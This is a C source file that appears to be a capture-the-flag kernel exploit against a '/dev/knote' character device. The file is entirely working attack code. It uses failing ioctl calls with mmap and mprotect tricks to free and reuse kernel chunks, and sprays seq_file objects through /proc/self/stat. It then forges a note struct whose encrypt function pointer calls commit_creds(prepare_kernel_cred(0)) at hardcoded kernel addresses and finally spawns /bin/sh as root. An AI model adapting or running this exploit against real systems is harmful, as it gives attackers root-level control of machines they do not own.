#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};

struct knote {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
};

struct knote_user {
    unsigned long idx;
    char * data;
    size_t len;
};

void get_root(char *dont, size_t use) {
        void (*commit_creds)(void *) = (void *)0xffffffff81053a30;
        void *(*prepare_kernel_cred)(int) = (void *)0xffffffff81053c50;

        commit_creds(prepare_kernel_cred(0));

}

int main(int argc, char *argv[]) {
    int fd = open("/dev/knote", O_RDONLY);
    struct knote_user kuser;
    struct knote *kn = malloc(sizeof(struct knote));
    
    //forge knote struct
    kn->data = malloc(sizeof(struct knote_user));
    kn->len = sizeof(struct knote_user);
    kn->encrypt_func = get_root;

    //allocate memory w/o rw permissions
    void *user_data = mmap(NULL, 0x1000, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if(user_data == MAP_FAILED) {
        fprintf(stderr, "mmap: %m\n");
        return -1;
    }
    
    //prep knote_user object
    kuser.idx = 0x4;
    kuser.data = (char *)user_data;
    kuser.len = 0x20;

    //knote wrapper
    struct knote_user *ku = malloc(sizeof(struct knote));
    ku->idx = 0x2;
    ku->data = (char *)kn;
    ku->len = sizeof(struct knote);

    if(ioctl(fd, KNOTE_CREATE, &kuser) < 0) {
        fprintf(stderr, "ioctl err: %m\n");
        //we expect this to error, that's part of the plan!!
    }

    printf("first chunks created and freed\n");
    getchar();
    
    /*kuser.idx = 0x5;
    kuser.len = 0x20;
    if(ioctl(fd, KNOTE_CREATE, &kuser) < 0) {
        fprintf(stderr, "ioctl err: %m\n");
        //we expect this to error, that's part of the plan!!
    }*/

    //change permissions of memory region
    if(mprotect(user_data, 0x1000, PROT_READ | PROT_WRITE) !=0) {
        fprintf(stderr, "mprotect: %m\n");
        return 1;
    }

    printf("data: %lx\n", (long *)kuser.data);
    getchar();
    int seq_fd = open("/proc/self/stat", 0);
    int seq_fd2 = open("/proc/self/status", 0);

    kuser.len = 0x20;
    if(ioctl(fd, KNOTE_READ, &kuser) < 0) {
        fprintf(stderr, "read: %m\n");
        return -1;
    }
    long *dat = (long *)kuser.data;

    printf("seq_fd:  %d\n", seq_fd);
    printf("seq_fd2: %d\n", seq_fd2);

    //printf("data: %lx %lx %lx %lx\n", (long *)kuser.data[0], (long *)kuser.data[1]), 
    //    (long *)kuser.data[2], (long *)kuser.data[3];
    printf("data: %lx\n", (long *)kuser.data);
    
    //change permissions of memory region
    if(mprotect(user_data, 0x1000, PROT_NONE) !=0) {
        fprintf(stderr, "mprotect: %m\n");
        return 1;
    }

    //prep knote_user object
    kuser.idx = 0x1;
    kuser.data = (char *)user_data;
    kuser.len = 0x20;
    
    getchar();
    if(ioctl(fd, KNOTE_CREATE, &kuser) < 0) {
        fprintf(stderr, "ioctl err: %m\n");
        //we expect this to error, that's part of the plan!!
    }
    
    //change permissions of memory region
    if(mprotect(user_data, 0x1000, PROT_READ | PROT_WRITE) !=0) {
        fprintf(stderr, "mprotect: %m\n");
        return 1;
    }

    getchar();
    if(ioctl(fd, KNOTE_CREATE, ku) < 0) {
        fprintf(stderr, "KNOTE_READ: %m\n");
        return -1;
    }

    if(ioctl(fd, KNOTE_ENCRYPT, &kuser) < 0) {
        fprintf(stderr, "encrypt: %m\n");
        return -1;
    }
    system("/bin/sh");

    printf("idx: %ld data: %lx len: %ld\n", kuser.idx, (long)kuser.data, kuser.len);

    return 0;
}
